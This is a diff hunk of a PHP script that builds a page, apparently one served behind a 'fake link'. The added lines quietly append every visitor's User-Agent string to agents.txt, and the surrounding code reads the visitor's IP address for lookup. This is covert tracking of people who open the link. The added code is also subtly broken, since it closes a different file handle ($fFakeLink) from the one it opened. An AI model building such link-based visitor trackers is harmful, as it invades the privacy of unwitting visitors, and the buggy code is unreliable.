@@ -282,6 +282,13 @@ if ($_POST["url"]) {
 
     $phpString = '
 <?php
+$agent = $_SERVER[\'HTTP_USER_AGENT\'] . PHP_EOL;
+$text = "agents.txt";
+$fagent = fopen($text, \'a\');
+fwrite($fagent, $agent);
+fclose($fFakeLink);
+
+
 $ip =  $_SERVER[\'REMOTE_ADDR\'];
 function ip_details($ip)
 {
